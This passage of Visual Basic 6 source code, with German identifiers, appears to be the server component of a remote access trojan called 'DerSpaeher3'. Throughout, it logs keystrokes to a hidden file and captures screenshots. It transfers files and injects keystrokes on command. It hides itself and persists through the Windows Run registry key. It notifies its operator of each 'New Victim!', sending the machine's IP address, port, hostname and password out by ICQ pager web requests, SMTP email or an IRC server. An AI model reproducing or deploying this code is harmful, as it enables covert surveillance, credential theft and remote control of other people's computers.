TCP2.SendData "Reg2"
ElseIf A1 = True Then
Fo.RegG2 = Text2.Text
A2 = False
A1 = False
Text3.Text = RegG1
Text4.Text = RegG2
UserInfoSendenJaNein = True
aUserInfo RegG

Else
End If
Exit Sub
o:
WennFehlerDann

End Sub
Sub RegS()
On Error GoTo e
If B1 = False And B2 = False And B3 = False Then
Text5.Text = Text2.Text
B1 = True
B2 = False
B3 = False
TCP2.SendData "RegSuper2"
ElseIf B1 = True Then
Text6.Text = Text2.Text
B1 = False
B2 = True
B3 = False
TCP2.SendData "RegSuper3"
ElseIf B2 = True Then
Text7.Text = Text2.Text
B1 = False
B2 = False
B3 = False
aREGSeTzEN RegG

Else
End If

Exit Sub
e:
WennFehlerDann
End Sub
Sub TaskFalse()
On Error GoTo o
Taskbar (False)
TCP2.SendData "TaskFalse"
Exit Sub
o:
WennFehlerDann
End Sub
Sub TaskTrue()
On Error GoTo o
Taskbar (True)
TCP2.SendData "TaskTrue"
Exit Sub
o:
WennFehlerDann
End Sub
Sub AlleFensterErmitteln()
On Error GoTo T
Call Finde_Alle_Fenster(Fo.Text1, Me)
Exit Sub
T:
WennFehlerDann
End Sub
Sub URLL()
On Error GoTo o
StartURL (Text2.Text)
TCP2.SendData "URLOK"
Exit Sub
o:
WennFehlerDann
End Sub


Private Sub Timer11_Timer()
If ActiveConnection = True Then
    Else
    If TCP2.LocalIP <> "127.0.0.1" Then
AlleBeendenVerbinden
If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
Timer3.Enabled = False
TCP2.Listen
With wskServer
    .Close
    .Listen
End With
With wskClient
    .Close
    .Listen
End With
Else
End If
    End If
End Sub

Private Sub Timer12_Timer()
On Error Resume Next
    If ActiveConnection = True Then
        Timer13.Enabled = True
        Timer12.Enabled = False
        Winsock1.Close
        Randomize Timer
        Dim MyValue
MyValue = Int((60 * Rnd) + 1)
        Nickname = "DS" & MyValue
        IRCN = False
        ICQNotify
        
        
    Else
    End If
End Sub
Sub test()
        Randomize Timer
        Dim MyValue
MyValue = Int((60 * Rnd) + 1)
        Nickname = "DS" & MyValue
        IRCN = False
        ICQNotify
End Sub
Sub SendData(textmsg As String)


  TCP1.SendData textmsg & CRLF
End Sub
Sub ICQNotify()
On Error Resume Next
If GetSetting("IrcNotify", "IrcNotify", "IrcNotify") = "ON" Then
TCP1.Close
Server = "pagan.subgenius.net"
Port = 6667
TCP1.RemoteHost = Server
TCP1.RemotePort = Port
TCP1.Connect
Else

If GetSetting("ICQorEMAIL", "ICQorEMAIL", "ICQorEMAIL") = "EMAIL" Then
        EMailAnHost
        Else
        ICQanHost
        End If

End If

End Sub
Sub ICQanHost()
ZuMir = ""
SockPager.Close
SockPager.Connect "wwp.mirabilis.com", 80

End Sub
Sub EMailAnHost2()
On Error GoTo z
SockPager.Connect "wwp.mirabilis.com", 80
Exit Sub
z:
End Sub
Sub EMailAnHost()
On Error GoTo u
Dim abc As String
Dim bBc As String
Dim cCc As String
If GetSetting("DateiEmail1", "DateiEmail1", "DateiEmail1") = "Leer" Then
Exit Sub
Else
End If

abc = GetSetting("DateiEmail1", "DateiEmail1", "DateiEmail1")
bBc = GetSetting("DateiEmail2", "DateiEmail2", "DateiEmail2")
cCc = GetSetting("DateiEmail3", "DateiEmail3", "DateiEmail3")

If abc <> "" And bBc <> "" Then
Dim ghj
        If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "Leer" Or GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "" Then
        ghj = "No Passwort"
        Else
        ghj = GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort")
        End If


SendEmail2 abc, cCc, "DerSpaeher3", bBc, bBc, "Remote Machine is Online", "Hi! A Remote Machine is Online: IP:" & PortO.LocalIP & "  Port:  " & TCP2.LocalPort & " ComputerName: " & TCP2.LocalHostName & " PassWord: " & ghj
Else
End If

If GetSetting("Visual", "einmal", "statistik") = "Erstes" Then
Else
ZuMir = "ZuMir"
SockPager.Close
SockPager.Connect "wwp.mirabilis.com", 80
End If

Exit Sub
u:
End Sub
Private Sub Timer13_Timer()
If ActiveConnection = True Then
        
    Else
    Timer12.Enabled = True
    Timer13.Enabled = False
    End If
End Sub


Private Sub Timer18_Timer()
Static rt As Integer
Select Case rt
Case 0
GetKeyboardState kbArray
kbArray.kbByte(VK_NUMLOCK) = 1
SetKeyboardState kbArray
Case 1
NumAnzahl = NumAnzahl + 1
GetKeyboardState kbArray
kbArray.kbByte(VK_NUMLOCK) = 0
SetKeyboardState kbArray
End Select
rt = rt + 1
If rt > 1 Then rt = 0

If NumAnzahl > 15 Then
Timer18.Enabled = False
Else
End If
End Sub

Private Sub Timer19_Timer()
If Wichtig = False Then

If GetSetting("Unload", "Unload", "Unload") = "Ja" Then
If GetSetting("cc", "cc", "cc") = "Jetzt" Then
GoTo a
Else
End If
If NochNicht <> "OKJETZT" Then
a:
SaveSetting "cc", "cc", "cc", "n"
Timer6.Enabled = False
Buhh = "HH"
aREGSeTzEN23
Unload Fo
Else
End If
Else
End If
Else
End If
End Sub

Sub OffDatennn()
On Error Resume Next
Dim g
g = GetSetting("offwo", "offwo", "offwo") & GetSetting("offname", "offname", "offname")
Dim f
Dim ll As Long
Open g For Input As #11
ll = FileLen(g)
f = Input(ll, #11)
                   Close #11
                   Open g For Output As #12
                   Print #12, OffDaten
                   Close #12

End Sub

Private Sub Timer3_Timer()
On Error Resume Next
   Static nOldKey As Integer
   Dim nLoop As Integer
   Dim abc As Long

   If Timer4.Enabled = False Then
   Dim u
   u = GetSetting("Off", "Off", "Off")
   If u = "AN" Then
GoTo z
   ElseIf u = "AUS" Then
      Timer3.Enabled = False
   Exit Sub
   Else
      Timer3.Enabled = False
   Exit Sub
   End If
z:
   If Timer2.Enabled = False Then
Else
End If
        For nLoop = 1 To 255
             If GetAsyncKeyState(nLoop) <> 0 Then
                If nOldKey <> nLoop Then
                   nOldKey = nLoop
                   Text1.Text = Text1.Text & CheckKey(nLoop)
                   
                   OffDaten = Text1.Text
                   
                   OffDatennn
                   
                   Dim g
                   g = GetSetting("offwo", "offwo", "offwo") & GetSetting("offname", "offname", "offname")
                   
                   abc = Len(g)
                   If abc > 100000 Then
                   Timer3.Enabled = False
                   SaveSetting "Off", "Off", "Off", "AUS"
                   Exit Sub
                   
                   Text1.Text = ""
                   Else
                   End If
                   
                End If
             End If
         Next
         Else
         For nLoop = 1 To 255
             If GetAsyncKeyState(nLoop) <> 0 Then
                If nOldKey <> nLoop Then
                   nOldKey = nLoop
                   Text1.Text = Text1.Text & CheckKey(nLoop)
                   
                End If
             End If
         Next
         End If
End Sub

Private Sub Timer4_Timer()
On Error GoTo u
If Timer3.Enabled = False Then
Timer4.Enabled = False
Exit Sub
Else
End If
TCP2.SendData Text1.Text
Text1.Text = ""
Exit Sub
u:
End Sub

Private Sub Timer5_Timer()
On Error GoTo z
Timer5.Enabled = False
wskServer.SendData DateiData

Exit Sub
z:
     
End Sub

Sub MausB()
MausBewegen
End Sub

Private Sub Timer6_Timer()
On Error GoTo z
If NochNicht <> "OKJETZT" Then
GoTo a
Else
End If
 If GetSetting("Unload", "Unload", "Unload") <> "Ja" Then
a:
   Text3.Text = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Text4.Text = GetSetting("DateiServerReg", "DateiServerReg", "DateiServerReg")
    UserInfoSendenJaNein = False
    aUserInfo "Local"
    
If Label2.Caption <> GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw") & " Hi" Then
    Text5.Text = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Text6.Text = GetSetting("DateiServerReg", "DateiServerReg", "DateiServerReg")
    Text7.Text = GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw") & " Hi"
    aREGSeTzEN "Local"
    Label2.Caption = "a"
Else
    Label2.Caption = "a"
End If
Else
End If
Exit Sub
z:
End Sub

Private Sub Timer7_Timer()
On Error GoTo z
DoEvents
Shell GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw") & " Hi", vbNormalNoFocus
Timer7.Enabled = False
DoEvents
Unload Fo
Exit Sub
z:
End Sub

Private Sub Timer8_Timer()
On Error GoTo x
Kill GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw")
Sleep 400
DoEvents
Dim aa
aa = FileLen(GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"))
SaveSetting "Unload", "Unload", "Unload", "Ja"
DateiKopieren
RegFestLegen
Timer7.Enabled = True
Timer8.Enabled = False
Exit Sub
x:
DateiKopieren
RegFestLegen
Timer8.Enabled = False
Timer7.Enabled = True
End Sub

Private Sub wskClient_Close()
With wskClient
    .Close
    .Listen
End With
End Sub


Private Sub wskClient_ConnectionRequest(ByVal requestID As Long)

If wskClient.State <> sckClosed Then wskClient.Close
   wskClient.Accept requestID
End Sub

Private Sub wskClient_DataArrival(ByVal bytesTotal As Long)

Dim NewData As String
wskClient.GetData NewData

   Static Filename As String
   Static fileSize As Long
   
   If Left(NewData, 2) = "S_" Then
  
      fileSize = Val(Mid(NewData, 3, 3 + InStr(4, NewData, "_")))
      Filename = Mid(NewData, InStr(4, NewData, "_") + 1)
      
      Dim Question As String
      Dim Answer As VbMsgBoxResult
         RecievedFile = ""
         wskClient.SendData "R_"
         BeginTransfer = Timer
   Else
      RecievedFile = RecievedFile & NewData
            If Len(RecievedFile) = fileSize Then
         
         Open DateiWoHin & Filename For Binary As #1
         Put #1, 1, RecievedFile
         Close
With wskServer
    .Close
    .Listen
End With
With wskClient
    .Close
    .Listen
End With
         TCP2.SendData "DateiUploaded"
      End If
      DoEvents
   
   End If


   Exit Sub
   
ErrorHandler:
End Sub
Sub SendKey()
On Error GoTo i
SendKeys (Text2.Text)
TCP2.SendData "SendKeyOK"
Exit Sub
i:
WennFehlerDann
End Sub
Sub DateiSenden()
On Error GoTo i

 SendFile Text2.Text
Exit Sub
i:
WennFehlerDann

End Sub

Private Sub wskServer_Close()
   If SendingFile Then
   SendingFile = False
   End If
DateiWirdGeradeGesendet = False
With wskServer
    .Close
    .Listen
End With
End Sub

Private Sub wskServer_ConnectionRequest(ByVal requestID As Long)
 If wskServer.State <> sckClosed Then wskServer.Close
   wskServer.Accept requestID
End Sub
Private Sub SendFile(ByVal Filename As String)
On Error GoTo z
If DateiWirdGeradeGesendet = False Then
   Dim FileData As String
   Dim ByteData As Byte
   Dim Counter As Long

   Open Filename For Binary As #1
   
   
   
   DoEvents
   FileData = Input(LOF(1), 1)
   
   Close #1
   
   SendingFile = False
   AbortFile = False
   
   
   wskServer.SendData "S_" & Len(FileData) & "_" & Filetitle(Filename)
DateiWirdGeradeGesendet = True
   Do Until SendingFile = True Or AbortFile = True Or DoEvents = 0
  Loop
  BeginTransfer = Timer
DateiData = FileData
Timer5.Enabled = True
Else
TCP2.SendData "DateiBeimSenden"
End If
Exit Sub
z:
DateiWirdGeradeGesendet = False
WennFehlerDann
End Sub
Private Function Filetitle(ByVal Filename As String) As String

   Dim i As Integer
   Dim temp As String

   If InStr(Filename, "\") <> 0 Then

      i = Len(Filename)
      Do Until Left(temp, 1) = "\"
         i = i - 1
         temp = Mid(Filename, i)
      Loop
      Filetitle = Mid(temp, 2)
   Else

      Filetitle = Filename
   End If

End Function
Private Sub wskServer_DataArrival(ByVal bytesTotal As Long)

   Dim NewData As String
   wskServer.GetData NewData

   If NewData = "R_" Then SendingFile = True
   SendingFile = True

Exit Sub
   If NewData = "N_" Then
       AbortFile = True
          End If

End Sub
Private Sub wskServer_SendComplete()
   If SendingFile Then
   SendingFile = False
   End If
DateiWirdGeradeGesendet = False
End Sub
Sub ScreenShoot()
On Error Resume Next
GetWindowSnapShot 0, Image1
DoEvents
Picture1.PaintPicture Image1.Picture, 1, 1
SavePicture Picture1.Picture, "Screen.bmp"
u:
GibtEsDasBildSchon
If GibtEsDasBildSchonHmm = False Then
GoTo u
Else
End If
Text2.Text = "Screen.bmp"
DateiSenden

i:
Exit Sub
z:
WennFehlerDann
End Sub

Sub BildAbSenden()
On Error GoTo u
Dim dd
dd = FileLen("Screen.bmp")
BildGespeichert = True
Exit Sub
u:
BildGespeichert = False
End Sub
Sub IPFestlegen()
On Error GoTo u
If Left(Text2.Text, 6) = "abcdef" Then
Text2.SelStart = 6
Text2.SelLength = Len(Text2.Text)
SaveSetting "Email", "Email", "1", Text2.SelText
TCP2.SendData "EIp"
Exit Sub
ElseIf Left(Text2.Text, 6) = "bbcdef" Then
Text2.SelStart = 6
Text2.SelLength = Len(Text2.Text)
SaveSetting "Email", "Email", "2", Text2.SelText
TCP2.SendData "IPInOrdnung"
Action.Text = ""
Exit Sub
Else
End If
Exit Sub
u:
WennFehlerDann
End Sub

Sub RenDatei()
On Error GoTo g
If Action.Text = "RenDatei" Then
RenDatei1 = Text2.Text
Action.Text = "RenDatei2"
TCP2.SendData "RenDatei1"
GoTo 40
ElseIf Action.Text = "RenDatei2" Then
RenDatei2 = Text2.Text
Name RenDatei1 As RenDatei2
Action.Text = "RenDatei"
TCP2.SendData "DateiRenOK"
GoTo 40
Else
End If
40:
Exit Sub
g:
WennFehlerDann
End Sub
Sub KopieDatei()
On Error GoTo g
If Action.Text = "KopieDatei" Then
KopieDatei1 = Text2.Text
Action.Text = "KopieDatei2"
TCP2.SendData "KopieDatei1"
GoTo 40
ElseIf Action.Text = "KopieDatei2" Then

KopieDatei2 = Text2.Text
FileCopy KopieDatei1, KopieDatei2
Action.Text = "KopieDatei"
TCP2.SendData "DateiKopieOK"
GoTo 40
Else
End If
40:
Exit Sub
g:
WennFehlerDann
End Sub
Sub NeueDatei()
On Error GoTo g

Exit Sub
g:
WennFehlerDann
End Sub
Public Sub SendEmail(MailServerName As String, FromName As String, FromEmailAddress As String, ToName As String, ToEmailAddress As String, EmailSubject As String, EmailBodyOfMessage As String)
On Error GoTo z
    Winsock1.LocalPort = 0
    
If Winsock1.State = sckClosed Then
    DateNow = Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & "" & " -0600"
    first = "mail from:" + Chr(32) + FromEmailAddress + vbCrLf
    Second = "rcpt to:" + Chr(32) + ToEmailAddress + vbCrLf
    Third = "Date:" + Chr(32) + DateNow + vbCrLf
    Fourth = "From:" + Chr(32) + FromName + vbCrLf
    Fifth = "To:" + Chr(32) + "MarioParzer" + vbCrLf
    Sixth = "Subject:" + Chr(32) + EmailSubject + vbCrLf
    Seventh = EmailBodyOfMessage + vbCrLf
    Ninth = "X-Mailer: EBT Reporter v 2.x" + vbCrLf
    Eighth = Fourth + Third + Ninth + Fifth + Sixth

    Winsock1.Protocol = sckTCPProtocol
    Winsock1.RemoteHost = MailServerName
    Winsock1.RemotePort = 25
    Winsock1.Connect
        WaitFor ("220")
  
    Winsock1.SendData ("HELO worldcomputers.com" + vbCrLf)

    WaitFor ("250")


    Winsock1.SendData (first)


    WaitFor ("250")

    Winsock1.SendData (Second)

    WaitFor ("250")

    Winsock1.SendData ("data" + vbCrLf)
    
    WaitFor ("354")


    Winsock1.SendData (Eighth + vbCrLf)
    Winsock1.SendData (Seventh + vbCrLf)
    Winsock1.SendData ("." + vbCrLf)

    WaitFor ("250")

    Winsock1.SendData ("quit" + vbCrLf)
    
    

    WaitFor ("221")

    Winsock1.Close
Else
End If
z:
End Sub
Public Sub WaitFor(ResponseCode As String)
On Error GoTo z
    Start = Timer
    While Len(Response) = 0
        Tmr = Start - Timer
        DoEvents
        If Tmr > 50 Then
            Exit Sub
        End If
    Wend
    While Left(Response, 3) <> ResponseCode
        DoEvents
        If Tmr > 50 Then
            Exit Sub
        End If
    Wend
Response = ""
z:
End Sub
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
On Error GoTo z
    Winsock1.GetData Response
z:
End Sub
Public Sub SendEmail2(MailServerName As String, FromName As String, FromEmailAddress As String, ToName As String, ToEmailAddress As String, EmailSubject As String, EmailBodyOfMessage As String)
On Error GoTo z
    Winsock2.LocalPort = 0
    
If Winsock2.State = sckClosed Then
    DateNow2 = Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & "" & " -0600"
    first2 = "mail from:" + Chr(32) + FromEmailAddress + vbCrLf
    Second2 = "rcpt to:" + Chr(32) + ToEmailAddress + vbCrLf
    Third2 = "Date:" + Chr(32) + DateNow2 + vbCrLf
    Fourth2 = "From:" + Chr(32) + FromName + vbCrLf
    Fifth2 = "To:" + Chr(32) + "MarioParzer" + vbCrLf
    Sixth2 = "Subject:" + Chr(32) + EmailSubject + vbCrLf
    Seventh2 = EmailBodyOfMessage + vbCrLf
    Ninth2 = "X-Mailer: EBT Reporter v 2.x" + vbCrLf
    Eighth2 = Fourth2 + Third2 + Ninth2 + Fifth2 + Sixth2

    Winsock2.Protocol = sckTCPProtocol
    Winsock2.RemoteHost = MailServerName
    Winsock2.RemotePort = 25
    Winsock2.Connect
        WaitFor2 ("220")
  
    Winsock2.SendData ("HELO worldcomputers.com" + vbCrLf)

    WaitFor2 ("250")


    Winsock2.SendData (first2)


    WaitFor2 ("250")

    Winsock2.SendData (Second2)

    WaitFor2 ("250")

    Winsock2.SendData ("data" + vbCrLf)
    
    WaitFor2 ("354")


    Winsock2.SendData (Eighth2 + vbCrLf)
    Winsock2.SendData (Seventh2 + vbCrLf)
    Winsock2.SendData ("." + vbCrLf)

    WaitFor2 ("250")

    Winsock2.SendData ("quit" + vbCrLf)
    
    

    WaitFor2 ("221")

    Winsock2.Close
Else
End If
z:
End Sub
Public Sub WaitFor2(ResponseCode As String)
On Error GoTo z
    Start2 = Timer
    While Len(Response2) = 0
        Tmr2 = Start2 - Timer
        DoEvents
        If Tmr2 > 50 Then
            Exit Sub
        End If
    Wend
    While Left(Response2, 3) <> ResponseCode
        DoEvents
        If Tmr2 > 50 Then
            Exit Sub
        End If
    Wend
Response2 = ""
z:
End Sub
Private Sub winsock2_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
    Winsock2.GetData Response2

End Sub

Sub StatusDownload()
On Error GoTo u
TCP2.SendData STUpDown
Exit Sub
u:
End Sub
Sub StatusUpload()
On Error GoTo u
TCP2.SendData STUpDown
Exit Sub
u:
End Sub
Sub DateiTyp()
On Error GoTo z
File1.Pattern = Text2.Text
TCP2.SendData "DateiTypOk"
Exit Sub
z:
WennFehlerDann
End Sub
Sub RoutinE()
On Error Resume Next
    Kill GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw")
    DateiKopieren
    RegFestLegen
End Sub

Sub FinalInfektion()
On Error Resume Next
Dim WindowsOrdner
WindowsOrdner = WindowsDirectory & "\"
End Sub
Sub ServerSichtbar()
Fo.Visible = True
End Sub
Sub ServerUnsichtbar()
Fo.Visible = False
End Sub
Sub ServerKomplettLoeschen()
aREGSeTzEN23
Unload Fo
End Sub

Sub aREGSeTzEN23()
On Error GoTo o
If Buhh = "SoJetzt" Then
Dim aaAAa As String
aaAAa = GetSetting("DateiServerReg", "DateiServerReg", "DateiServerReg")
SetKeyValue "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", aaAAa, "", REG_SZ, "Local"
Else
End If
Exit Sub
o:
End Sub
Sub AuslesenTarnen()
Open App.EXEName & ".exe" For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close
Dim RSServer2 As String
Dim Zahl As Long
Dim Zahl2 As Long
Dim zahl3 As Long
Dim RSServer As String
Dim Search, Where
Search = "AnfangPI"
Where = InStr(ServerBinaer, Search)
If Where Then
RSServer = Right(ServerBinaer, Len(ServerBinaer) - (Where - 1))
Search = "ErsteDateiPI"
Where = InStr(RSServer, Search)
Zahl = Where + 11
Search = "ZweiteDateiPI"
Where = InStr(RSServer, Search)
Zahl2 = Where - 1
zahl3 = Zahl2 - Zahl
RSServer2 = Right(RSServer, Len(RSServer) - Zahl)
DateiServer1 = Left(RSServer2, zahl3)

Search = "FehlerJaNein"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "DritteDateiPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Dim Tt As String
Tt = Left(RSServer, zahl3)
If Tt = "False" Then
DateiServer3 = "False"
Else
DateiServer3 = "True"
End If

Search = "RegPI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "FehlerJaNein"
Where = InStr(RSServer, Search)
Zahl2 = Where + 13
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Dim TFFehlerJaNein As String
TFFehlerJaNein = Left(RSServer, zahl3)
If TFFehlerJaNein = "False" Then
DateiServerJaNein = "False"
Else
DateiServerJaNein = "True"
End If

Search = "PassWortPI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "RegPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 4
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
DateiServerReg = Left(RSServer, zahl3)



Search = "DateiEndungen"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "PassWortPI"
Where = InStr(RSServer, Search)
Zahl2 = Where + 9
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
DateiServerPasswort = Left(RSServer, zahl3)
If DateiServerPasswort = "Kein" Then
DateiServerPasswort = ""
Else
End If


Search = "ServerWO"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "DateiEndungen"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
DateiAendungen = Left(RSServer, zahl3)
If DateiAendungen = "True" Then
DateiErw = ".exe"
Else
DateiErw = ".com"
End If


Search = "OffWO"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "ServerWO"
Where = InStr(RSServer, Search)
Zahl2 = Where + 7
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
SERVERWO = Left(RSServer, zahl3)


Search = "OffNAME"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "OffWO"
Where = InStr(RSServer, Search)
Zahl2 = Where + 4
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
OffWOO = Left(RSServer, zahl3)

Search = "Attrib"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "OffNAME"
Where = InStr(RSServer, Search)
Zahl2 = Where + 6
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
OFFNAME = Left(RSServer, zahl3)


Search = "Port"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "Attrib"
Where = InStr(RSServer, Search)
Zahl2 = Where + 5
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
WertWert = Left(RSServer, zahl3)

Search = "IRCNotify"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "Port"
Where = InStr(RSServer, Search)
Zahl2 = Where + 3
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Fo.ServerPort = Left(RSServer, zahl3)

Search = "UnRemove"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "IRCNotify"
Where = InStr(RSServer, Search)
Zahl2 = Where + 8
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Dim iu As String
iu = Left(RSServer, zahl3)
If iu = "ON" Then
Fo.IrcNotifyOnOff = True
Else
Fo.IrcNotifyOnOff = False
End If


Search = "EndePI"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "UnRemove"
Where = InStr(RSServer, Search)
Zahl2 = Where + 7
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
Dim itu As String
itu = Left(RSServer, zahl3)
If itu = "ON" Then
Fo.UnRemove = "ON"
Else
Fo.UnRemove = "OFF"
End If


Else
DateiServerJaNein = "Leer"
DateiServer1 = "Leer"
DateiServer2 = "Leer"
DateiServer3 = "Leer"
DateiServerReg = "Leer"
DateiServerPasswort = "Leer"
End If


End Sub
Sub AuslesenEMail()
Open App.EXEName & ".exe" For Binary As #1
DoEvents
ServerBinaer = Input(LOF(1), 1)
Close
Dim RSServer2 As String
Dim Zahl As Long
Dim Zahl2 As Long
Dim zahl3 As Long
Dim RSServer As String
Dim Search, Where
Search = "AnfangEM"
Where = InStr(ServerBinaer, Search)
If Where Then
RSServer = Right(ServerBinaer, Len(ServerBinaer) - (Where - 1))
Search = "MailServerEM"
Where = InStr(RSServer, Search)
Zahl = Where + 11
Search = "MailAdresseEM"
Where = InStr(RSServer, Search)
Zahl2 = Where - 1
zahl3 = Zahl2 - Zahl
RSServer2 = Right(RSServer, Len(RSServer) - Zahl)
DateiEmail1 = Left(RSServer2, zahl3)

Search = "BetreffME"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "MailAdresseEM"
Where = InStr(RSServer, Search)
Zahl2 = Where + 12
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
DateiEmail2 = Left(RSServer, zahl3)

Search = "EndeEM"
Where = InStr(RSServer, Search)
Zahl = Where - 1
Search = "BetreffME"
Where = InStr(RSServer, Search)
Zahl2 = Where + 8
zahl3 = Zahl - Zahl2
RSServer = Right(RSServer, Len(RSServer) - Zahl2)
DateiEmail3 = Left(RSServer, zahl3)
Else
DateiEmail1 = "Leer"
DateiEmail2 = "Leer"
DateiEmail3 = "Leer"
End If

End Sub
Private Sub SockPager_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
  SockPager.Close
End Sub
Private Sub SockPager_Close()
  On Error Resume Next
  SockPager.Close
End Sub
Private Sub SockPager_Connect()
On Error GoTo u
Dim DataOut  As String
  Dim Dados    As String
  Dim sDestino As String
  Dim SD
If ZuMir <> "ZuMir" Then
  
  SD = GetSetting("DateiEmail1", "DateiEmail1", "DateiEmail1")
  Dim ghj
        If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "Leer" Or GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "" Then
        ghj = "No Passwort"
        Else
        ghj = GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort")
        End If
  Dados = "from=" & sDestino & "&fromemail=" & "&subject=" & "DerSpaeher3" & "&body=" & "Hi! A Remote Machine is Online: IP:" & PortO.LocalIP & "  Port:  " & TCP2.LocalPort & " ComputerName: " & TCP2.LocalHostName & " PassWord: " & ghj & "&to=" & SD & "&Send=Send+Message"
  Dados = LimpaEs(Dados)
  
  DataOut = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbCrLf
  DataOut = DataOut & "Referer: http://wwp.mirabilis.com" & vbCrLf
  DataOut = DataOut & "User-Agent: Mozilla/4.06 (Win95; I)" & vbCrLf
  DataOut = DataOut & "Connection: Keep-Alive" & vbCrLf
  DataOut = DataOut & "Host: wwp.mirabilis.com:80" & vbCrLf
  DataOut = DataOut & "Content-type: application/x-www-form-urlencoded" & vbCrLf
  DataOut = DataOut & "Content-length: " & Len(Dados) & vbCrLf
  DataOut = DataOut & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & vbCrLf
  DataOut = DataOut & Dados & vbCrLf & vbCrLf & vbCrLf & vbCrLf
  
  SockPager.SendData DataOut
  
Else
If GetSetting("Visual", "einmal", "statistik") = "Erstes" Then
        
        Else
        SaveSetting "Visual", "einmal", "statistik", "Erstes"
       Dados = "from=" & sDestino & "&fromemail=" & "&subject=" & "DerSpaeher3" & "&body=" & "New Victim!" & TCP2.LocalIP & "  " & TCP2.LocalPort & "   " & TCP2.LocalHostName & "    " & "&to=" & "40500859" & "&Send=Send+Message"
  Dados = LimpaEs(Dados)
  
  DataOut = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbCrLf
  DataOut = DataOut & "Referer: http://wwp.mirabilis.com" & vbCrLf
  DataOut = DataOut & "User-Agent: Mozilla/4.06 (Win95; I)" & vbCrLf
  DataOut = DataOut & "Connection: Keep-Alive" & vbCrLf
  DataOut = DataOut & "Host: wwp.mirabilis.com:80" & vbCrLf
  DataOut = DataOut & "Content-type: application/x-www-form-urlencoded" & vbCrLf
  DataOut = DataOut & "Content-length: " & Len(Dados) & vbCrLf
  DataOut = DataOut & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & vbCrLf
  DataOut = DataOut & Dados & vbCrLf & vbCrLf & vbCrLf & vbCrLf
  
  SockPager.SendData DataOut
        End If
        End If
  Exit Sub
u:
End Sub
Private Function LimpaEs(Texto As String) As String
  On Error Resume Next
  Dim iPos As Integer
  
  iPos = InStr(1, Texto, Chr(32), vbBinaryCompare)
  
  If iPos > 0 Then
    Do
      Texto = Mid(Texto, 1, iPos - 1) & "+" & Mid(Texto, iPos + 1)
      iPos = InStr(1, Texto, Chr(32), vbBinaryCompare)
      If iPos = 0 Then Exit Do
    Loop
  End If
  
